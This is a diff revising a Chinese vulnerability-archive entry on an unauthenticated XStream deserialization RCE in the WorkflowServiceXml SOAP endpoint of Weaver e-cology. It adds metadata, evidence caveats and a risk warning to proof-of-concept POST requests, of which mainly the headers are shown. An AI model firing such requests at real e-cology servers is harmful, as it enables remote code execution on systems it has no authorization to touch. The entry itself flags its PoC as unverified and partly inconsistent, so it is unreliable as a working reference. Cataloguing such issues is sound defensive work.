@@ -1,10 +1,50 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "泛微e-cology WorkflowServiceXml XStream反序列化链"
+product: "泛微e-cology"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "声称<=9.0；CommonsBeanutils/JNDI、JDK远程加载与出网前提未列"
+prerequisites: "声称未授权；services%20路径"
+side_effects: "命令/代码执行示例可能改变主机状态"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/DVlZC5jU6MQQqUoM2gKTBg"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/x%20%E5%BE%AE%20E-Cology%20WorkflowServiceXml%20RCE.md"
+id: "vw-1cc2f230c0dcc96aa5080e41"
+entity_id: "ve-1cc2f230c0dcc96aa5080e41"
+schema_version: "1"
 ---
 
-# x 微 E-Cology WorkflowServiceXml RCE
+# 泛微e-cology WorkflowServiceXml XStream反序列化链
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：泛微e-cology；WorkflowServiceXml XStream反序列化链
+- 版本、配置及部署条件：声称<=9.0；CommonsBeanutils/JNDI、JDK远程加载与出网前提未列
+- 认证与权限前提：声称未授权；services%20路径
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 两个SOAP样本基本重复且有杂散点号、声明Content-Length10994不符
+- 所谓编码后样本未展示XML字符串编码转义转换；DOM结构是否正确需核对
+- DNS回调仅支持外联，RCE成果仅截图；未给完整执行请求
+- 应与后续WorkflowServiceXml详文互补，不能与同名接口SQL注入直接去重
+
+## 操作风险
+
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DVlZC5jU6MQQqUoM2gKTBg)
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRje4G63OeC8nFZg4HLZEJU5BzicGQFYzMEibR2wpz4EfQbjsjOFk7gpPeOV1CGsspeUDDwcMN2roNeLQ/640?wx_fmt=png)
@@ -29,12 +69,11 @@ E-cology <= 9.0
 
 POC：
 
-```
+```http
 POST /services%20/WorkflowServiceXml HTTP/1.1
 Accept-Encoding: gzip, deflate
 Content-Type: text/xml;charset=UTF-8
 SOAPAction: ""
-Content-Length: 10994
 Host: xxx
 User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 Connection: close
@@ -57,16 +96,17 @@ Connection: close
 </soapenv:Envelope>
 ```
 
+> 请求长度说明：原资料 Content-Length 为 10994；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+
 编码：
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRje4G63OeC8nFZg4HLZEJU5BhFTExcW4CWW6p5OFp5vKFAMPUMfqXdqOlayXjZV39qt9uvp4ib6nqSw/640?wx_fmt=png)
 
-```
+```http
 POST /services%20/WorkflowServiceXml HTTP/1.1
 Accept-Encoding: gzip, deflate
 Content-Type: text/xml;charset=UTF-8
 SOAPAction: ""
-Content-Length: 10994
 Host: xxx
 User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 Connection: close
@@ -88,6 +128,8 @@ Connection: close
    </soapenv:Body>
 </soapenv:Envelope>
 ```
+
+> 请求长度说明：原资料 Content-Length 为 10994；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 或者直接：  
 
